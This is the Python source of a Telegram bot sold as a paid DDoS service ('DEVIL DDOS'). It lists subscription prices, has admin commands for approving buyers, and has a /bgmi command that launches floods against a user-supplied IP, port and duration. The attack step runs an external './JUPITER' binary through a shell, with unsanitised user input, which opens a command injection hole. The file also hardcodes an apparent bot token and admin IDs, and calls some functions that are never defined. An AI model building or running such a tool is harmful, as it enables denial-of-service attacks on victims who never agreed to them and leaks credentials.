#script by @MR_ARMAN_OWNER

import telebot
import subprocess
import datetime
import os


# insert your Telegram bot token here
bot = telebot.TeleBot('8145041605:AAEHfiobK1rQcFXo5vTv13nRqtkOT4oskiI')

# Admin user IDs
admin_id = ["5997540330"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["6050786012"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"💐 HEY. {user_to_add}\n🌟 YOU'RE APPROVED ✅ FOR {duration} {time_unit}\n🔥INJOY THE BOT ☺️👩🏻‍💻\n\nAPPROVED BYE @enemy_wealth\n⚡ACCESS WILL EXPIRE {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add 😘."
    else:
        response = "You have not purchased yet purchase now from:- @enemy_wealth."

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "You have not purchased yet purchase now from:- @enemy_wealth 🙇."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "You have not purchased yet purchase now from :- @enemy_wealth ❄."
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully ✅"
        except FileNotFoundError:
            response = "users are already cleared ❌."
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @enemy_wealth 🙇."
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @enemy_wealth❄."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "𝙏𝙝𝙞𝙨 𝘽𝙤𝙩 𝙞𝙨 𝙤𝙣𝙡𝙮 𝙛𝙤𝙧 𝙥𝙖𝙞𝙙 𝙪𝙨𝙚𝙧𝙨 𝙗𝙪𝙮 𝙣𝙤𝙬 𝙛𝙧𝙤𝙢 - @enemy_wealth \n205 KALA JADU "
        bot.reply_to(message, response)


# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🌟 WOOOOOOOOOOH 🌟\n\nATTACKING [ ON YOUR IP ]....🧨\n⚔ STARTED ⚔\n\n🥷ATTACKED IP ==) ( {target} )\n🥷 ATTACKED PORT ==) ( {port} )\n⏰ ATTACK TIME -> ( {time} ) SECONDS 🔥\n💎 ATTACKED BYE ARMAN TEAM ⚔\n\nWAIT THERE WHITHOUT TOUCHING ANY BUTTON {time} SECONDS\n\nTHANKS FOR USING AUR HAX 🔥\n\nᴅᴇᴠᴇʟᴏᴘᴇʀ :--> @enemy_wealth"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =10

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "❌ ⚡𝙔𝙊𝙐𝙍 𝙊𝙉 𝘾𝙊𝙊𝙇𝘿𝙊𝙒𝙉 ⚡ ❌\n\n🐥 𝘽𝘼𝘽𝙔  𝙒𝘼𝙄𝙏 [ 10 𝙎𝙀𝘾𝙊𝙉𝘿𝙎 ]\n🌟 𝘽𝙊𝙏 𝙄𝙎 𝙍𝙀𝘾𝙃𝘼𝙍𝙂𝙄𝙉𝙂 🔌\nᴅᴇᴠᴇʟᴏᴘᴇʀ :--> @enemy_wealth"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 300:
                response = "Error: Time interval must be less than 300."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./JUPITER {target} {port} {time} "
                process = subprocess.run(full_command, shell=True)
                response = f"⚔ 𝙈𝙄𝙎𝙎𝙄𝙊𝙉 𝘼𝘾𝘾𝙊𝙈𝙋𝙇𝙄𝙎𝙃𝙀𝘿.... ⚔\n\n🎯 𝙏𝘼𝙍𝙂𝙀𝙏 𝙉𝙀𝙐𝙏𝙍𝘼𝙇𝙄𝙕𝙀𝘿 :--> [ {target} ]\n💣 𝙋𝙊𝙍𝙏 𝘽𝙍𝙀𝘼𝘾𝙃𝙀𝘿:-->  [ {port} ] ⚙\n⌛ 𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍 :--> [ {time} ] ⏰\n\n𝙊𝙥𝙚𝙧𝙖𝙩𝙞𝙤𝙣 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚. 𝙉𝙤 𝙀𝙫𝙞𝙙𝙚𝙣𝙘𝙚 𝙇𝙚𝙛𝙩 𝘽𝙚𝙝𝙞𝙣𝙙. 𝘾𝙤𝙪𝙧𝙩𝙚𝙨𝙮 𝙤𝙛 :--> @enemy_wealth 🌟\n\n𝘿𝙀𝘼𝙍 𝙐𝙎𝙀𝙍𝙎 𝙒𝙀 𝙑𝘼𝙇𝙐𝙀 𝙊𝙁 𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝙎𝙊𝙊 𝙋𝙇𝙀𝘼𝙎𝙀 𝙎𝙀𝙉𝘿 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆𝙎 ✅ 𝙄𝙉 𝘾𝙃𝘼𝙏 ☺️"
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "𝐃𝐄𝐀𝐑 𝐔𝐒𝐄𝐑. 🧨\n\n𝐔𝐒𝐀𝐆𝐄 /bgmi < 𝐈𝐏 > < 𝐏𝐎𝐑𝐓 > < 𝐓𝐈𝐌𝐄 >\n\n𝙁𝙊𝙍 𝙀𝙓𝘼𝙈𝙋𝙇𝙀 :-> /bgmi 20.0.0.0 10283 100\n\n𝘿𝙊𝙉'𝙏 𝙎𝙋𝘼𝙈 ⚠️‼️\nᴛʜɪs ʙᴏᴛ ᴏᴡɴᴇʀ ❤️‍🩹:--> @enemy_wealth"  # Updated command syntax
    else:
        response = ("🚫 ᴜɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴀᴄᴄᴇꜱꜱ! 🚫\n\nᴏᴏᴘꜱ! ɪᴛ ꜱᴇᴇᴍꜱ ʟɪᴋᴇ ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴛᴏ ᴜꜱᴇ ᴛʜᴇ /ᴀᴛᴛᴀᴄᴋ ᴄᴏᴍᴍᴀɴᴅ. ᴛᴏ ɢᴀɪɴ ᴀᴄᴄᴇꜱꜱ ᴀɴᴅ ᴜɴʟᴇᴀꜱʜ ᴛʜᴇ ᴘᴏᴡᴇʀ ᴏꜰ ᴀᴛᴛᴀᴄᴋꜱ, ʏᴏᴜ ᴄᴀɴ:\n\n👉 ᴄᴏɴᴛᴀᴄᴛ ᴀɴ ᴀᴅᴍɪɴ ᴏʀ ᴛʜᴇ ᴏᴡɴᴇʀ ꜰᴏʀ ᴀᴘᴘʀᴏᴠᴀʟ.\n🌟 ʙᴇᴄᴏᴍᴇ ᴀ ᴘʀᴏᴜᴅ ꜱᴜᴘᴘᴏʀᴛᴇʀ ᴀɴᴅ ᴘᴜʀᴄʜᴀꜱᴇ ᴀᴘᴘʀᴏᴠᴀʟ.\n💬 ᴄʜᴀᴛ ᴡɪᴛʜ ᴀɴ ᴀᴅᴍɪɴ ɴᴏᴡ ᴀɴᴅ ʟᴇᴠᴇʟ ᴜᴘ ʏᴏᴜʀ ᴄᴀᴘᴀʙɪʟɪᴛɪᴇꜱ\n\n🚀 ʀᴇᴀᴅʏ ᴛᴏ ꜱᴜᴘᴇʀᴄʜᴀʀɢᴇ ʏᴏᴜʀ ᴇxᴘᴇʀɪᴇɴᴄᴇ? ᴛᴀᴋᴇ ᴀᴄᴛɪᴏɴ ᴀɴᴅ ɢᴇᴛ ʀᴇᴀᴅʏ ꜰᴏʀ ᴘᴏᴡᴇʀꜰᴜʟ ᴀᴛᴛᴀᴄᴋꜱ!\n\n𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 @enemy_wealth")

    bot.reply_to(message, response)


# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command 😡."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 Available commands:
💥 /attack : 🌟 𝙏𝙊 𝙇𝘼𝙐𝙉𝘾𝙃 𝘼𝙉 𝙋𝙊𝙒𝙀𝙍𝙁𝙐𝙇 𝘼𝙏𝙏𝘼𝘾𝙆 🧨.
💥 /rules : 🌟 𝙋𝙇𝙀𝘼𝙎𝙀 𝘾𝙃𝙀𝘾𝙆 ✔️ 𝘽𝙀𝙁𝙊𝙍𝙀 𝙐𝙎𝙀 ⚡.
💥 /mylogs : 🌟 𝙏𝙊 𝘾𝙃𝙀𝘾𝙆 𝙔𝙊𝙐𝙍 𝙍𝙀𝘾𝙀𝙉𝙏 𝘼𝙏𝙏𝘼𝘾𝙆𝙎 💂🏻‍♀️.
💥 /plan : 🌟 𝘾𝙃𝙀𝘾𝙆 𝙊𝙐𝙏 𝘼𝙐𝙍 𝙋𝙊𝙒𝙀𝙍𝙁𝙐𝙇 𝘽𝙊𝙏 𝙋𝙍𝙄𝘾𝙀𝙎 ⚡.
💥 /myinfo : 🌟 𝙏𝙊 𝘾𝙃𝙀𝘾𝙆 𝙔𝙊𝙐𝙍 𝙒𝙃𝙊𝙇𝙀 𝙄𝙉𝙁𝙊 🌪️.

🤖 𝙏𝙊 𝙎𝙀𝙀 𝘼𝘿𝙈𝙄𝙉 𝘾𝙈𝙉𝘿 ( 𝘼𝘿𝙈𝙄𝙉𝙎 𝙊𝙉𝙇𝙔 ) ⚠️:
💥 /admincmd : Shows All Admin Commands.

Buy From :- @enemy_wealth
Official Channel :- https://t.me/+NHAvWut1g881Yzk1 
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''🌟 WELCOME TO DEVIL DDOS 🌟\n🔥 OWNER -> @enemy_wealth\n🔥 CHANNEL -> https://t.me/+NHAvWut1g881Yzk1 🧐 -> /bgmi 🌟'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
3. MAKE SURE YOU JOINED PRIVATE  OTHERWISE NOT WORK
4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

Vip 🌟 :
-> Attack Time : 300 (S)
> After Attack Limit : 10 sec
-> Concurrents Attack : 5

Pr-ice List💸 :
Day-->50Rs
Week-->250Rs
Month-->500 Rs
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
💥 /clearusers : Clear The USERS File.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "𝘼𝙇𝙀𝙍𝙏 ⚠️‼️\n𝙏𝙃𝙄𝙎 𝙈𝙀𝙎𝙎𝘼𝙂𝙀 𝙎𝙀𝙉𝙏 𝙁𝙍𝙊𝙈 :--> 𝘼𝙍𝙈𝘼𝙉 𝙏𝙀𝘼𝙈 ✅:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)



#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)


